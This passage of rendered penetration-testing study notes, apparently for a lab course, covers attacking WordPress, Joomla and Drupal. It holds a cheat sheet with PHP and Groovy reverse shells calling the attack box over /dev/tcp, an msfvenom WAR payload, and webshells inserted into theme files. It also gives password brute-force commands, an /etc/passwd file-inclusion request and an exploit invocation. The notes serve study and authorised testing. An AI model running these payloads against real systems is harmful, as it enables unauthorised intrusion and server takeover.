  <a href="#discovery_1" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration_1" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-drupal" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Drupal
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Drupal">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#leveraging-the-php-filter-module" class="md-nav__link">
    <span class="md-ellipsis">
      Leveraging the PHP Filter Module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#uploading-a-backdoored-module" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading a Backdoored Module
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drupalgeddon" class="md-nav__link">
    <span class="md-ellipsis">
      Drupalgeddon
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drupalgeddon2" class="md-nav__link">
    <span class="md-ellipsis">
      Drupalgeddon2
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#drupalgeddon3" class="md-nav__link">
    <span class="md-ellipsis">
      Drupalgeddon3
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#tomcat" class="md-nav__link">
    <span class="md-ellipsis">
      Tomcat
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Tomcat">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discoveryfootprinting" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery/Footprinting
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration_2" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-tomcat" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Tomcat
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Tomcat">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#tomcat-manager-login-brute-force" class="md-nav__link">
    <span class="md-ellipsis">
      Tomcat Manager - Login Brute Force
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#tomcat-manager-war-file-upload" class="md-nav__link">
    <span class="md-ellipsis">
      Tomcat Manager - WAR File Upload
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#jenkins" class="md-nav__link">
    <span class="md-ellipsis">
      Jenkins
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Jenkins">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovery-enumeration" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery &amp; Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-jenkins" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Jenkins
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Jenkins">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#script-console" class="md-nav__link">
    <span class="md-ellipsis">
      Script Console
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#discovery_2" class="md-nav__link">
    <span class="md-ellipsis">
      Discovery
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumeration_3" class="md-nav__link">
    <span class="md-ellipsis">
      Enumeration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attacking-splunk" class="md-nav__link">
    <span class="md-ellipsis">
      Attacking Splunk
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Attacking Splunk">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#abusing-built-in-functionality_1" class="md-nav__link">
    <span class="md-ellipsis">
      Abusing Built-In Functionality
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h1 id="attacking-common-applications">Attacking Common Applications</h1>
<h2 id="cheat-sheet">Cheat Sheet</h2>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sudo vim /etc/hosts</code></td>
<td>Opens /etc/hosts with vim to add hostnames</td>
</tr>
<tr>
<td><code>sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list</code></td>
<td>Runs nmap scan on common web ports from scope_list, outputs to web_discovery in all formats</td>
</tr>
<tr>
<td><code>eyewitness --web -x web_discovery.xml -d &lt;nameofdirectorytobecreated&gt;</code></td>
<td>Runs eyewitness on nmap XML output, creates directory</td>
</tr>
<tr>
<td><code>cat web_discovery.xml \| ./aquatone -nmap</code></td>
<td>Pipes nmap XML to aquatone as nmap input</td>
</tr>
<tr>
<td><code>sudo wpscan --url &lt;http://domainnameoripaddress&gt; --enumerate</code></td>
<td>Runs wpscan with enumeration on target URL</td>
</tr>
<tr>
<td><code>sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url &lt;http://domainnameoripaddress&gt;</code></td>
<td>Runs wpscan XMLRPC password attack with rockyou wordlist</td>
</tr>
<tr>
<td><code>curl -s http://&lt;hostnameoripoftargetsite&gt;/path/to/webshell.php?cmd=id</code></td>
<td>Executes id command via PHP webshell with curl</td>
</tr>
<tr>
<td><code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip address of attack box&gt;/&lt;port of choice&gt; 0&gt;&amp;1'"); ?&gt;</code></td>
<td>PHP code for Linux reverse shell</td>
</tr>
<tr>
<td><code>droopescan scan joomla --url http://&lt;domainnameoripaddress&gt;</code></td>
<td>Runs droopescan against Joomla site</td>
</tr>
<tr>
<td><code>sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr &lt;username or path to username list&gt;</code></td>
<td>Runs joomla-brute.py with specified wordlist and usernames</td>
</tr>
<tr>
<td><code>&lt;?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?&gt;</code></td>
<td>PHP webshell for Drupal, command via GET parameter</td>
</tr>
<tr>
<td><code>curl -s &lt;http://domainname or IP address of site&gt;/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \| grep uid \| cut -f4 -d"&gt;"</code></td>
<td>Executes id via Drupal webshell with curl</td>
</tr>
<tr>
<td><code>gobuster dir -u &lt;http://domainnameoripaddressofsite&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code></td>
<td>Directory brute force with gobuster and wordlist</td>
</tr>
<tr>
<td><code>auxiliary/scanner/http/tomcat_mgr_login</code></td>
<td>Metasploit module for Tomcat manager brute force</td>
</tr>
<tr>
<td><code>python3 mgr_brute.py -U &lt;http://domainnameoripaddressofTomCatsite&gt; -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code></td>
<td>Runs mgr_brute.py against Tomcat /manager with default creds lists</td>
</tr>
<tr>
<td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address of attack box&gt; LPORT=&lt;port to listen on to catch a shell&gt; -f war &gt; backup.war</code></td>
<td>Generates JSP reverse shell WAR payload</td>
</tr>
<tr>
<td><code>nmap -sV -p 8009,8080 &lt;domainname or IP address of tomcat site&gt;</code></td>
<td>Nmap version scan for Tomcat and AJP ports</td>
</tr>
<tr>
<td><code>r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 \| while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"] as String[]) p.waitFor()</code></td>
<td>Groovy Linux reverse shell for Jenkins Script Console</td>
</tr>
<tr>
<td><code>def cmd = "cmd.exe /c dir".execute(); println("${cmd.text}");</code></td>
<td>Groovy command execution for Windows Jenkins Script Console</td>
</tr>
<tr>
<td><code>String host="localhost"; int port=8044; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);</code></td>
<td>Groovy Windows reverse shell for Jenkins Script Console</td>
</tr>
<tr>
<td><a href="https://github.com/0xjpuff/reverse_shell_splunk"><code>reverse_shell_splunk</code></a></td>
<td>Splunk package for reverse shells on Windows/Linux</td>
</tr>
</tbody>
</table>
<h2 id="enumeration-tools">Enumeration Tools</h2>
<ul>
<li>
<p><a href="https://github.com/RedSiege/EyeWitness">Eyewitness</a>
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1">sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>eyewitness
</span><span id="__span-0-2">eyewitness<span class="w"> </span>--web<span class="w"> </span>-x<span class="w"> </span>web_discovery.xml<span class="w"> </span>-d<span class="w"> </span>inlanefreight_eyewitness
</span></code></pre></div></td></tr></table></div></p>
</li>
<li>
<p><a href="https://github.com/michenriksen/aquatone">Aquatone</a>
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1">wget<span class="w"> </span>https://github.com/michenriksen/aquatone/releases/download/v1.7.0/aquatone_linux_amd64_1.7.0.zip
</span><span id="__span-1-2">unzip<span class="w"> </span>aquatone_linux_amd64_1.7.0.zip
</span><span id="__span-1-3"><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
</span></code></pre></div></td></tr></table></div></p>
</li>
<li>move to a $PATH location(<code>/usr/local/bin</code>) or current working folder
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1">cat<span class="w"> </span>web_discovery.xml<span class="w"> </span><span class="p">|</span><span class="w"> </span>./aquatone<span class="w"> </span>-nmap
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h2 id="example-note-layout">Example note layout</h2>
<p>External Penetration Test - &lt;Client Name&gt;</p>
<ul>
<li>Scope (including in-scope IP addresses/ranges, URLs, any fragile hosts, testing timeframes, and any limitations or other relative information we need handy)</li>
<li>Client Points of Contact</li>
<li>Credentials</li>
<li>Discovery/Enumeration<ul>
<li>Scans</li>
<li>Live hosts</li>
</ul>
</li>
<li>Application Discovery<ul>
<li>Scans</li>
<li>Interesting/Notable Hosts</li>
</ul>
</li>
<li>Exploitation<ul>
<li>\&lt;Hostname or IP&gt;</li>
<li>\&lt;Hostname or IP&gt;</li>
</ul>
</li>
<li>Post-Exploitation<ul>
<li>\&lt;Hostname or IP&gt;</li>
<li>\&lt;Hostname or IP&gt;</li>
</ul>
</li>
<li>Appendix<ul>
<li>Exploited systems (hostname/IP and method of exploitation)</li>
<li>Compromised users (account name, method of compromise, account type (local or domain))</li>
<li>Artifacts created on systems</li>
<li>Changes (such as adding a local admin user or modifying group membership)</li>
</ul>
</li>
</ul>
<h2 id="wordpress">Wordpress</h2>
<h3 id="manual-enumeration">Manual Enumeration</h3>
<ul>
<li><code>robots.txt</code> - can quickly identify if WordPress used</li>
<li><code>curl -s http://blog.inlanefreight.local | grep WordPress</code> - another quick identification method</li>
<li><code>wp-content/plugins</code> - plugins directory</li>
<li><code>wp-content/themes</code> - themes directory</li>
<li>WordPress user typses on a standard installation<ol>
<li>Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.</li>
<li>Editor: An editor can publish and manage posts, including the posts of other users.</li>
<li>Author: They can publish and manage their own posts.</li>
<li>Contributor: These users can write and manage their own posts but cannot publish them.</li>
<li>Subscriber: These are standard users who can browse posts and edit their profiles.</li>
</ol>
</li>
<li>Manually browse and look at page source</li>
<li>Grep for wp-content directory, themes and plugin:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>themes
</span><span id="__span-3-2">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>plugins
</span></code></pre></div></td></tr></table></div></li>
<li>Enumerate versions of found plugins<ul>
<li>Check for <code>readme.txt</code> in their directories i.e: <code>http://blog.inlanefreight.local/wp-content/plugins/mail-masta/readme.txt</code></li>
<li>Check for vulnerabilities of found versions</li>
</ul>
</li>
<li>Continue enumaration on other pages i.e: <code>curl -s http://blog.inlanefreight.local/?p=1 | grep plugins</code></li>
<li>Try some manual enumeration of usernames and/or passwords at the default login page <code>http://blog.inlanefreight.local/wp-login.php</code> (testing for different error messages; correct user wrong password etc)</li>
<li>Can use <a href="https://github.com/tomnomnom/waybackurls">waybackurls</a> to check for old versions of the site<ul>
<li>Could discover vulnerable plugins that are no longer used but have not been properly removed</li>
</ul>
</li>
</ul>
<h3 id="wpscan-enumeration">WPScan Enumeration</h3>
<ul>
<li><a href="https://wpvulndb.com/">WPVulnDB</a> to obtain API token
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1">sudo<span class="w"> </span>gem<span class="w"> </span>install<span class="w"> </span>wpscan
</span><span id="__span-4-2">wpscan<span class="w"> </span>-h
</span></code></pre></div></td></tr></table></div></li>
<li>Default enumeration (plugins, themes, users, media, and backups):
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1">sudo<span class="w"> </span>wpscan<span class="w"> </span>--url<span class="w"> </span>http://blog.inlanefreight.local<span class="w"> </span>--enumerate<span class="w"> </span>--api-token<span class="w"> </span>dEOFB<span class="se">\&lt;</span>SNIP<span class="se">\&gt;</span>
</span></code></pre></div></td></tr></table></div></li>
<li>Default threads used is 5, change with <code>-t</code> flag.</li>
</ul>
<h3 id="attacking-wordpress">Attacking Wordpress</h3>
<h4 id="login-bruteforce">Login bruteforce</h4>
<ul>
<li><a href="https://kinsta.com/blog/xmlrpc-php/"><code>/xmlrpc.php</code></a></li>
<li>The <code>-U</code> flag will also take a file of usernames or a single username</li>
<li>Same for the <code>-P</code> flag and passwords</li>
<li>We can also bruteforce wp-login if xmlrpc isn't available but it is slower
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1">sudo<span class="w"> </span>wpscan<span class="w"> </span>--password-attack<span class="w"> </span>xmlrpc<span class="w"> </span>-t<span class="w"> </span><span class="m">20</span><span class="w"> </span>-U<span class="w"> </span>john<span class="w"> </span>-P<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--url<span class="w"> </span>http://blog.inlanefreight.local
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="code-execution">Code execution</h4>
<ul>
<li>With access to admin panel</li>
<li>Go to Appearence side panel, then theme editor</li>
<li>Select inactive theme to avoid corrupting the main theme (click select)</li>
<li>Edit an uncommon page such as <code>404.php</code></li>
<li>Add below code just below initital comments
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1">system<span class="o">(</span><span class="nv">$_GET</span><span class="o">[</span><span class="m">0</span><span class="o">])</span><span class="p">;</span>
</span></code></pre></div></td></tr></table></div></li>
<li>Click update file to save</li>
<li>Send commands to the relevant theme page like below:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1">curl<span class="w"> </span>http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0<span class="o">=</span>id
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="metasploit-wp_admin_shell_upload-module">Metasploit <a href="https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/">wp_admin_shell_upload</a> module</h4>
<p><div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span>
<span class="normal">5</span>
<span class="normal">6</span>
<span class="normal">7</span>
<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1">use<span class="w"> </span>exploit/unix/webapp/wp_admin_shell_upload<span class="w"> </span>
</span><span id="__span-9-2"><span class="nb">set</span><span class="w"> </span>username<span class="w"> </span>john
</span><span id="__span-9-3"><span class="nb">set</span><span class="w"> </span>password<span class="w"> </span>firebird1
</span><span id="__span-9-4"><span class="nb">set</span><span class="w"> </span>lhost<span class="w"> </span><span class="m">10</span>.10.14.15<span class="w"> </span>
</span><span id="__span-9-5"><span class="nb">set</span><span class="w"> </span>rhost<span class="w"> </span><span class="m">10</span>.129.42.195<span class="w">  </span>
</span><span id="__span-9-6"><span class="nb">set</span><span class="w"> </span>VHOST<span class="w"> </span>blog.inlanefreight.local
</span><span id="__span-9-7">show<span class="w"> </span>options<span class="w"> </span>
</span><span id="__span-9-8">exploit
</span></code></pre></div></td></tr></table></div>
- Make note of where the shell was uploaded to for later clean up</p>
<h4 id="vulnerable-plugin-examples">Vulnerable plugin examples</h4>
<p><strong>mail-masta</strong>
- Local file inclusion
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl<span class="o">=</span>/etc/passwd
</span></code></pre></div></td></tr></table></div></p>
<p><strong>wpDiscuz</strong></p>
<ul>
<li><a href="https://www.exploit-db.com/exploits/49967">WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)</a><ul>
<li><code>-u</code> URL flag</li>
<li><code>-p</code> path to a valid post flag  <br />
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1">python3<span class="w"> </span>wp_discuz.py<span class="w"> </span>-u<span class="w"> </span>http://blog.inlanefreight.local<span class="w"> </span>-p<span class="w"> </span>/?p<span class="o">=</span><span class="m">1</span>
</span></code></pre></div></td></tr></table></div></li>
</ul>
</li>
<li>Once webshell uploaded can enter commands within the script</li>
<li>If commands fail within the script they can be executed with curl using the the upload location shown in the script output</li>
<li>Example:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1">curl<span class="w"> </span>-s<span class="w"> </span>http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd<span class="o">=</span>id
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h2 id="joomla">Joomla</h2>
<h3 id="discovery">Discovery</h3>
<ul>
<li>Grep the page:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1">curl<span class="w"> </span>-s<span class="w"> </span>http://dev.inlanefreight.local/<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>Joomla
</span></code></pre></div></td></tr></table></div></li>
<li>Will possibly be indicated in the <code>robots.txt</code></li>
<li>Could be seen in the readme.txt:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1">curl<span class="w"> </span>-s<span class="w"> </span>http://dev.inlanefreight.local/README.txt<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-n<span class="w"> </span><span class="m">5</span>
</span></code></pre></div></td></tr></table></div></li>
<li>Joomla sites sometimes have a telltale favicon</li>
<li>Possibly find the version in use
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1">curl<span class="w"> </span>-s<span class="w"> </span>http://app.inlanefreight.local/administrator/manifests/files/joomla.xml<span class="w"> </span><span class="p">|</span><span class="w"> </span>xmllint<span class="w"> </span>--format<span class="w"> </span>-
</span></code></pre></div></td></tr></table></div></li>
<li>May also find the version number in <code>media/system/js/</code> or <code>administrator/manifests/files/joomla.xml</code> (approximate)</li>
</ul>
<h3 id="enumeration">Enumeration</h3>
<h4 id="droopscan">Droopscan</h4>
<ul>
<li>Works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-16-1">sudo<span class="w"> </span>pip3<span class="w"> </span>install<span class="w"> </span>droopescan
</span><span id="__span-16-2">droopescan<span class="w"> </span>-h
</span><span id="__span-16-3">droopescan<span class="w"> </span>scan<span class="w"> </span>joomla<span class="w"> </span>--url<span class="w"> </span>http://dev.inlanefreight.local/
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="joomlascan"><a href="https://github.com/drego85/JoomlaScan">JoomlaScan</a></h4>
<ul>
<li>Out of date and requires python 2.7</li>
<li>Not as valuable as droopescan, can help us find accessible directories and files and may help with fingerprinting installed extensions
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-17-1">curl<span class="w"> </span>https://pyenv.run<span class="w"> </span><span class="p">|</span><span class="w"> </span>bash
</span><span id="__span-17-2"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;export PYENV_ROOT=&quot;$HOME/.pyenv&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
</span><span id="__span-17-3"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;command -v pyenv &gt;/dev/null || export PATH=&quot;$PYENV_ROOT/bin:$PATH&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
</span><span id="__span-17-4"><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;eval &quot;$(pyenv init -)&quot;&#39;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
</span><span id="__span-17-5"><span class="nb">source</span><span class="w"> </span>~/.bashrc
</span><span id="__span-17-6">pyenv<span class="w"> </span>install<span class="w"> </span><span class="m">2</span>.7
</span><span id="__span-17-7">pyenv<span class="w"> </span>shell<span class="w"> </span><span class="m">2</span>.7
</span><span id="__span-17-8">python2.7<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>urllib3
</span><span id="__span-17-9">python2.7<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>certifi
</span><span id="__span-17-10">python2.7<span class="w"> </span>-m<span class="w"> </span>pip<span class="w"> </span>install<span class="w"> </span>bs
</span><span id="__span-17-11">python2.7<span class="w"> </span>joomlascan.py<span class="w"> </span>-u<span class="w"> </span>http://dev.inlanefreight.local
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h4 id="bruteforcing-weak-admin-password">Bruteforcing weak admin password</h4>
<ul>
<li><code>admin</code> is the default admin account, password is set at install</li>
<li>Attempt brute force with <a href="https://github.com/ajnik/joomla-bruteforce">joomla-bruteforce</a> script 
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-18-1">wget<span class="w"> </span>https://raw.githubusercontent.com/ajnik/joomla-bruteforce/refs/heads/master/joomla-brute.py
</span><span id="__span-18-2">sudo<span class="w"> </span>python3<span class="w"> </span>joomla-brute.py<span class="w"> </span>-u<span class="w"> </span>http://app.inlanefreight.local<span class="w"> </span>-w<span class="w"> </span>/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt<span class="w"> </span>-usr<span class="w"> </span>admin
</span></code></pre></div></td></tr></table></div></li>
</ul>
<h3 id="attacking-joomla">Attacking Joomla</h3>
<ul>
<li>Search the version online for known vulnerabilities</li>
</ul>
<h4 id="abusing-built-in-functionality">Abusing Built-In Functionality</h4>
<ul>
<li>Once valid admin credentials obtained, log in to admin dashboard at <code>/administrator</code>
<strong>TIP:</strong> If you receive an error stating "An error has occurred. Call to a member function format() on null" after logging in, navigate to "http://dev.inlanefreight.local/administrator/index.php?option=com_plugins" and disable the "Quick Icon - PHP Version Check" plugin.</li>
<li>Click on templates under configuration (bottom left)</li>
<li>Click on a template name under the Templates column header</li>
<li>Choose a none standard page, <code>error.php</code> for example.</li>
<li>Add the web shell after initial comments
<div class="language-php highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">PHP</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><span class="x">system($_GET[&#39;dcfdd5e021a869fcc6dfaef8bf31377e&#39;]); # randomness added to prevent drive by attack whilst performing pentest</span>
</span></code></pre></div></td></tr></table></div></li>
<li>Click <code>Save &amp; Close</code></li>
<li>Confirm code execution
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1">curl<span class="w"> </span>-s<span class="w"> </span>http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e<span class="o">=</span>id
</span></code></pre></div></td></tr></table></div></li>
<li>Remember to remove webshell after recording the vulnerability</li>
</ul>
<h2 id="drupal">Drupal</h2>
<h3 id="discovery_1">Discovery</h3>
<ul>
<li>"Powered by Drupal" header/footer</li>
<li>Standard Drupal logo</li>
<li>The presence of a CHANGELOG.txt file or README.txt file, via the page source</li>
<li>Clues in the robots.txt file such as references to /node</li>
<li>grep search:
<div class="language-bash highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Bash</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1">curl<span class="w"> </span>-s<span class="w"> </span>http://drupal.inlanefreight.local<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>Drupal
</span></code></pre></div></td></tr></table></div></li>
